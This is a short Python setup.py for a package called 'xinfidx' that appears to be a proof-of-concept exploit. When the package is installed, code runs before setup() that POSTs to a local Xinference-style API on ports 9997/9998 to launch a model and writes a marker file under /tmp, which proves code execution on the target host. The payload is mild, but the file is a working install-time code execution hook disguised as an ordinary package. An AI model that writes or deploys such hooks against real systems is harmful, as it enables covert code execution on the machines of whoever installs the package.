# -*- coding: utf-8 -*-
import os, json, socket, urllib.request
def _probe():
    try:
        host = socket.gethostname()
    except Exception:
        host = "unknown"
    # 自证 1：调目标自身 REST 启动模型（可经 /v1/models 外部观察）
    for port in (9997, 9998):
        try:
            req = urllib.request.Request(
                "http://127.0.0.1:%d/v1/models" % port,
                data=json.dumps({"model_uid": "xinf-venv-proof",
                                 "model_name": "bge-m3",
                                 "model_type": "embedding"}).encode(),
                headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=20)
            break
        except Exception:
            continue
    # 自证 2：落标记文件
    for p in ("/tmp/.xinf-venv-%s" % host,):
        try:
            open(p, "w").write("ok %s" % host)
        except Exception:
            pass
_probe()
from setuptools import setup
setup(name="xinfidx", version="1.0.0", py_modules=[])
